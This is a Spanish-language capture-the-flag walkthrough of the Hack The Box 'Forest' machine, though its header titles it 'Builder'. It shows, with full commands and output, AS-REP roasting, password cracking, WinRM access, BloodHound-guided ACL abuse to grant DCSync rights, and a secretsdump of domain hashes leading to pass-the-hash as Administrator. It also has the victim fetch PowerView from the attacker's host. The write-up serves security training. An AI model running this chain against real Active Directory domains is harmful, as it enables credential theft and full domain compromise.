---
layout: post
title: HTB Builder
date: 2024-02-19 22:42:53 -0500
categories:
  - HTB
  - Medium
tags:
  - AD
  - Windows
  - Bloodhound
  - Asreproast
  - ACL
  - DCSync
  - RPC
  - Groups
image:
  path: /forest/preview.png
  alt: Builder
---

## Resumen 
![logo](/forest/logo.png){: .right w="200" h="200" }

**Forest** es una excelente máquina para practicar temas clave relacionados con **Active Directory**, abarcando diversas etapas. Comenzamos con la **enumeración de usuarios** utilizando **RPC**, y luego lanzamos un ataque de **AS-REP Roasting** gracias a los usuarios obtenidos. Este ataque nos permite conseguir un **ticket** que se puede crackear con **John**, proporcionándonos acceso directo al dominio.

Una vez dentro del dominio, se puede realizar una **enumeración** adicional con la ayuda de **BloodHound** y **SharpHound** para entender de manera gráfica qué está sucediendo en el entorno. Con esta información, podemos observar que, debido a los permisos inadecuados, es posible comprometer todo el dominio. El usuario **svc-alfresco** cuenta con herencia de grupos, incluyendo uno privilegiado que tiene **ACLs** para añadir a un usuario a un grupo con el privilegio **WriteDACL** sobre el dominio. Esto nos permite conceder a nuestro usuario el permiso necesario para ejecutar un ataque **DCSync** y dumpear todos los **hashes** del dominio, completando así la máquina.



## Reconocimiento

Para empezar, se realiza un **ping** para saber si hay conectividad con la máquina.

```bash
❯ ping 10.129.252.2 -c 1
PING 10.129.252.2 (10.129.252.2) 56(84) bytes of data.
64 bytes from 10.129.252.2: icmp_seq=1 ttl=127 time=175 ms

--- 10.129.252.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 174.564/174.564/174.564/0.000 ms
```
{: .nolineno}


### Escaneo de Puertos
Luego se realiza un **escaneo de puertos** para ver cuáles se encuentran abiertos dentro de la máquina.
```bash
❯ nmap -p- --min-rate 3000 10.129.252.2 -Pn -oG TCPports

Not shown: 55184 closed tcp ports (conn-refused), 10328 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49698/tcp open  unknown
54675/tcp open  unknown
```
{: .nolineno}

Gracias a la información obtenida, se puede realizar un **escaneo mucho más profundo** para saber qué **tecnologías** y **versiones** se están utilizando dentro del que parece ser un **Domain Controller**

```bash
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49698,54675 -sVC  --min-rate 3000 10.129.252.2 -Pn -oA versionesTCP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 18:51 EDT
Nmap scan report for 10.129.252.2
Host is up (0.20s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-04 22:58:43Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
54675/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-08-04T15:59:36-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-04T22:59:37
|_  start_date: 2024-08-04T22:45:59
```
{: .nolineno}

Gracias a esto, sabemos cuál es el **nombre del dominio**, por lo que hay que registrarlo en el archivo `/etc/hosts` y se puede empezar a interactuar con él.

```c
127.0.0.1   localhost
127.0.1.1   kali
::1     localhost ip6-localhost ip6-loopback
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters

10.129.252.2 htb.local
```
{: .nolineno}
## Enumeración

Para realizar una enumeración general del **dominio**, se puede hacer uso de la herramienta `enum4linux-ng` , la cual se encarga de realizar ciertas validaciones y devolvernos información que puede ser de gran utilidad sobre el dominio.

### Usuarios 

Para extraer los nombres de los usuarios, se puede guardar la salida relacionada con los usuarios y se le puede aplicar el siguiente filtro:

```c
❯ cat user.txt  | grep username  | tr -d " " | awk  '{print $2}' FS=':'
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
Administrator
Guest
krbtgt
DefaultAccount
```

### Grupos 

Para los grupos se puede aplicar la misma lógica de los nombres pero con el siguiente filtro:

```c
cat groups.txt | grep groupname | tr -d " " | awk '{print $2}' FS=':'
DnsAdmins
DnsUpdateProxy
OrganizationManagement
RecipientManagement
View-OnlyOrganizationManagement
PublicFolderManagement
UMManagement
HelpDesk
RecordsManagement
DiscoveryManagement
ServerManagement
DelegatedSetup
HygieneManagement
ComplianceManagement
SecurityReader
SecurityAdministrator
ExchangeServers
ExchangeTrustedSubsystem
ManagedAvailabilityServers
ExchangeWindowsPermissions
ExchangeLegacyInterop
$D31000-NSEL5BRJ63V7
ServiceAccounts
PrivilegedITAccounts
EnterpriseRead-onlyDomainControllers
test
DomainAdmins
DomainUsers
DomainGuests
DomainComputers
DomainControllers
CertPublishers
SchemaAdmins
EnterpriseAdmins
GroupPolicyCreatorOwners
Read-onlyDomainControllers
CloneableDomainControllers
ProtectedUsers
KeyAdmins
EnterpriseKeyAdmins
Administrators
Users
Guests
AccountOperators
ServerOperators
PrintOperators
BackupOperators
Replicator
RASandIASServers
Pre-Windows2000CompatibleAccess
RemoteDesktopUsers
NetworkConfigurationOperators
IncomingForestTrustBuilders
PerformanceMonitorUsers
PerformanceLogUsers
WindowsAuthorizationAccessGroup
TerminalServerLicenseServers
DistributedCOMUsers
IIS_IUSRS
CryptographicOperators
AllowedRODCPasswordReplicationGroup
DeniedRODCPasswordReplicationGroup
EventLogReaders
CertificateServiceDCOMAccess
RDSRemoteAccessServers
RDSEndpointServers
RDSManagementServers
Hyper-VAdministrators
AccessControlAssistanceOperators
RemoteManagementUsers
SystemManagedAccountsGroup
StorageReplicaAdministrators
```

### Políticas

```c
 =========================================
|    Policies via RPC for 10.129.252.2    |
 =========================================
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
```

## Explotación 


Como se cuenta con la lista de nombres de los **usuarios en el dominio**, se puede intentar realizar un ataque de **AS-REP Roasting**, esto con el fin de enumerar si existe algún usuario que sea un **SPN**, para poder conseguir su **ticket** e intentar romperlo con ayuda de **John**.
### Asreproasting

>**AS-REP Roasting** es un ataque en el que se obtienen tickets de autenticación de usuarios sin preautenticación habilitada, para intentar descifrarlos y obtener sus contraseñas.
{: .prompt-info}

Para validar esto, podemos hacer uso de **Impacket**, herramienta a la que le pasaremos la lista de usuarios y veremos si alguno nos devuelve el **ticket**.

```c
❯ impacket-GetNPUsers 'htb.local/' -usersfile userOrder.txt -no-pass -dc-ip 10.129.252.2  -request
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:322a9bdc853263e0e1c485b99d13f64d$85f8b9c7c96caa31debe539ba61cc4bd174e81c492de9d17edf822605a71981052fdf3d5c901ea330f92ac29348e55a152c0057f3a152f553adf953ee4e6528a8824bb856d358faa58a3df754fe02d38aedf3925acea84e664b5268407a35e2c39d33dd972b987adb2d93982503193fae1d9b34d83545054627c110106f97258997684bcb1d70e7f2e63884636393ddb33011088c00951dcbbc7fbeda64150e00553ec254603132d745abad1e65bdd9f1a6810b102ffb5265557a398e3fd1de57d22653efa7e30a412551f084309c44279be5d72b56dd3e53b9db7c3219e1a472fa6f570558a
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Por último, ahora solo queda romper el **ticket**. Esto se puede hacer con ayuda de **John** con el siguiente comando:

```c
cat ticket.txt

$krb5asrep$23$svc-alfresco@HTB.LOCAL:322a9bdc853263e0e1c485b99d13f64d$85f8b9c7c96caa31debe539ba61cc4bd174e81c492de9d17edf822605a71981052fdf3d5c901ea330f92ac29348e55a152c0057f3a152f553adf953ee4e6528a8824bb856d358faa58a3df754fe02d38aedf3925acea84e664b5268407a35e2c39d33dd972b987adb2d93982503193fae1d9b34d83545054627c110106f97258997684bcb1d70e7f2e63884636393ddb33011088c00951dcbbc7fbeda64150e00553ec254603132d745abad1e65bdd9f1a6810b102ffb5265557a398e3fd1de57d22653efa7e30a412551f084309c44279be5d72b56dd3e53b9db7c3219e1a472fa6f570558a

john ticket.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:06 DONE (2024-08-04 19:39) 0.1605g/s 655820p/s 655820c/s 655820C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Como contamos con **credenciales**, podemos intentar ver a qué servicios tenemos acceso. Esto se puede hacer con ayuda de **CrackMapExec**. Con esto en mente, podemos hacer uso de los siguientes comandos:

```c
❯ crackmapexec smb 10.129.252.2  -d "htb.local"  -u "svc-alfresco" -p "s3rvice"
SMB         10.129.252.2    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.252.2    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 

```

```c
❯ crackmapexec winrm 10.129.252.2  -d "htb.local"  -u "svc-alfresco" -p "s3rvice"
HTTP        10.129.252.2    5985   10.129.252.2     [*] http://10.129.252.2:5985/wsman
WINRM       10.129.252.2    5985   10.129.252.2     [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Como confirmamos que nuestras **credenciales** son válidas, nos podemos conectar por **WinRM** con ayuda de la herramienta **Evil-WinRM**. Gracias a esto, tendríamos un acceso inicial y ya podríamos buscar la **flag de usuario**.

```powershell
❯ evil-winrm -u "svc-alfresco" -p "s3rvice" -i 10.129.252.2
   
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> pwd

Path
----
C:\Users\svc-alfresco\Documents


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> hostname
FOREST
```

## Escalada de Privilegios

Ahora que nos encontramos dentro de la **máquina**, vamos a intentar enumerar información dentro de ella para poder escalar privilegios. Esto se puede hacer por varios caminos, como lo son **WinPEAS** o **SharpHound**. Sin embargo, nos vamos a centrar en enumerar el **dominio** para ver con qué permisos contamos, por lo que vamos a usar **SharpHound** en combinación con **BloodHound**. Para esto, necesitamos transferir el archivo a la víctima, lo cual se puede hacer con ayuda del mismo **Evil-WinRM** con el siguiente comando:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /home/kali/HTB/Forests/content/SharpHound.exe

Info: Uploading /home/kali/HTB/Forests/content/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\s
```

Ahora podemos empezar a enumerar información del **dominio** con el siguiente comando:

```powershell
.\SharpHound.exe --CollectionMethods All --ZipFileName HTB.LOCAL.zip

... 

118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-08-04T18:34:37.8511477-07:00|INFORMATION|SharpHound Enumeration Completed at 6:34 PM on 8/4/2024! Happy Graphing!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```


Y para terminar, podemos enviar el resultado a nuestra máquina para analizarlos con **BloodHound**.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20240804183407_HTB.LOCAL.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Documents\20240804183407_HTB.LOCAL.zip to 20240804183407_HTB.LOCAL.zip
                                        
Info: Download successful!
```

```c
❯ ll
.rw-r--r-- kali kali   18 KB Sun Aug  4 21:34:28 2024  20240804183407_HTB.LOCAL.zip
.rw-r--r-- kali kali  530 B  Sun Aug  4 19:17:12 2024  domainUsers.txt
```
### Enumeración del AD

Para poder usar **BloodHound**, primero debemos lanzar la base de datos **Neo4j** con el siguiente comando:

```c
sudo neo4j console

Starting Neo4j.
2024-08-05 00:40:18.090+0000 INFO  Starting...
2024-08-05 00:40:19.635+0000 INFO  This instance is ServerId{097bb94a} (097bb94a-41f1-4bd5-93e8-40cdaafc54c7)
2024-08-05 00:40:23.235+0000 INFO  ======== Neo4j 4.4.26 ========
2024-08-05 00:40:27.491+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2024-08-05 00:40:27.492+0000 INFO  Updating the initial password in component 'security-users'
2024-08-05 00:40:32.844+0000 INFO  Bolt enabled on localhost:7687.
2024-08-05 00:40:36.712+0000 INFO  Remote interface available at http://localhost:7474/
2024-08-05 00:40:36.727+0000 INFO  id: 915257CCD5776E980DCCB9C0CC4FF0A9F542D3987BEEE684FD33641F74F1406E
2024-08-05 00:40:36.728+0000 INFO  name: system
2024-08-05 00:40:36.728+0000 INFO  creationDate: 2024-07-07T22:21:12.77Z
2024-08-05 00:40:36.728+0000 INFO  Started.
```

Luego de subir el grafo, se debe buscar el **usuario** sobre el que contamos privilegios para luego obtener información sobre cómo podemos realizar un ataque al **dominio**.

![user](/forest/userBlood.png)

Al usar el filtro **Shortest Paths to High Value Targets**, parece que hay un **path** que nos permite tomar control del **dominio** desde la cuenta **svc-alfresco**. El camino sería el siguiente:

### Plan de ataque

1. Iniciar sesión en la cuenta **svc-alfresco**.
2. El usuario es miembro del grupo **Service Accounts**.
3. Los miembros de **Service Accounts** pertenecen al grupo **Privileged IT Accounts**.
4. Los miembros de **Privileged IT Accounts** tienen **GenericAll** sobre el grupo **Exchange Windows Permissions**, por lo que pueden añadir a un usuario a este grupo por medio de la **ACL**.
5. Los miembros del grupo **Exchange Windows Permissions** tienen el permiso **WriteDacl** sobre el dominio, por lo que se le puede dar el permiso a un usuario para que pueda realizar un ataque **DCSync** y así dumpear todos los **hashes** dentro del dominio.
6.  Tomar control del dominio !!!!

![path](/forest/path.png)


Ahora vamos a crear un **usuario** para que los permisos queden sobre este mismo. Esto se puede hacer con ayuda del comando **net**:

```powershell
net user madlies madlies123 /add 
The command completed successfully.
```

Es importante tener en cuenta que del **paso 1** al **paso 3** ya los tenemos completados por tener acceso a la cuenta **svc-alfresco**. Con esto en mente, simplemente hay que partir desde el **paso 4** y añadir a nuestro usuario al grupo privilegiado. Para poder ejecutar los comandos necesarios, debemos hacer uso del script **PowerView**, por lo que hay que enviarlo a la máquina. 

Podemos montar un servidor en python para transferir el archivo:

```c
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y dentro de la máquina lo podemos descargar

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> wget http://10.10.14.94/PowerView.ps1 -O PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         8/4/2024   7:46 PM         770279 PowerView.ps1
-a----         8/4/2024   6:27 PM        1046528 SharpHound.exe
```

Ahora importamos el modulo con el siguiente comando:

```c
PS C:\Users\svc-alfresco\Documents> import-module .\PowerView.ps1
```

Con el entorno configurado de forma correcta, ya podemos seguir los comandos que nos indica **BloodHound**.

#### Añadir un usuario a un grupo por GenericAll

Se puede hacer uso del siguiente comando:

```powershell
Add-DomainGroupMember -Identity 'group' -Members 'user'
```

Pero debemos añadir los datos correspondientes:

```powershell
PS C:\Users\svc-alfresco\Documents> Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'madlies'
PS C:\Users\svc-alfresco\Documents> net user madlies
User name                    madlies
Full Name
Comment
... 

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
```

#### Otorgar permisos para DCSync

Como ahora mismo no nos encontramos dentro de la cuenta que tiene los permisos para ejecutar el ataque, podemos crear un objeto con sus credenciales para que sea como si el usuario los ejecutara.

```powershell
$SecPassword = ConvertTo-SecureString 'madlies123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\madlies', $SecPassword)
```

Ahora añadimos el permiso para que se pueda ejecutar el ataque con el siguiente comando:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity madlies -Rights DCSync -Credential $Cred
```

Y para terminar ejecutamos el ataque con ayuda de `Impacket-secretdump`: 

```c
❯ impacket-secretsdump 'htb'/'madlies':'madlies123'@'10.129.252.2'  -outputfile forest_hashes
Impacket v0.11.0 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
```

Para validar que todo ha sido correcto se hace uso de `CME`, esto con el fin de validar que se cuenta con el `HASH` correcto:

```bash
❯ crackmapexec winrm 10.129.252.2  -d "htb.local"  -u "Administrator" -H "32693b11e6aa90eb43d32c72a07ceea6"
HTTP        10.129.252.2    5985   10.129.252.2     [*] http://10.129.252.2:5985/wsman
WINRM       10.129.252.2    5985   10.129.252.2     [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

Y ya solo queda conectarse a la máquina con ayuda de `Evil-winrm` y poder conseguir la `flag` del usuario `administrador`.

```powershell
❯ evil-winrm -u "administrator" -H "32693b11e6aa90eb43d32c72a07ceea6" -i 10.129.252.2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  

Info: Establishing connection to remote endpoint
PS C:\Users\Administrator\Documents> whoami
htb\administrator
PS C:\Users\Administrator\Documents> hostname
FOREST
PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::199
   IPv6 Address. . . . . . . . . . . : dead:beef::ec65:d7c4:f350:db55
   Link-local IPv6 Address . . . . . : fe80::ec65:d7c4:f350:db55%5
   IPv4 Address. . . . . . . . . . . : 10.129.252.2
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%5
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
```